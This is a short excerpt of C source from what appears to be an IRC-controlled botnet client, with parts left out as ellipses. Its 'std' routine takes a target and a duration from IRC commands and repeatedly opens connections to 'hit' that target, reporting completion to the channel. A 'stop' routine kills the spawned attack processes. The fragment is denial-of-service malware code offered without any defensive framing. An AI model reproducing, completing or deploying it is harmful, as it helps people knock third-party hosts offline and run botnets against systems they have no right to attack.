...
void std(int sock, char *sender, int argc, char **argv)
{
	...
	char *eptr;
	secs = strtol(argv[3], &eptr, 10);
	if (*eptr != '\0' || secs <= 0) {
		Send(sock, "PRIVMSG %s :[STD]Syntax error\n", chan);
		exit(1);
	}
	...
	while (1) {
		if (a >= 50) {
			...
			connect(iSTD_Sock, (struct sockaddr *)&sin,
				sizeof(sin));
			if (time(NULL) >= start + secs) {
				Send(sock,
				     "PRIVMSG %s :[STD]Done hitting %s!\n",
				     chan, argv[1]);
				close(iSTD_Sock);
				exit(0);
			}
...
void stop(int sock, char *sender, int argc, char **argv)
{
	...
	for (i = 0; i < numpids; i++) {
		if (pids[i] != 0 && pids[i] != getpid()) {
			if (sender)
				Send(sock, "PRIVMSG %s :Killing pid %d.\n",
				     chan, pids[i]);
			kill(pids[i], 9);
		}
	}
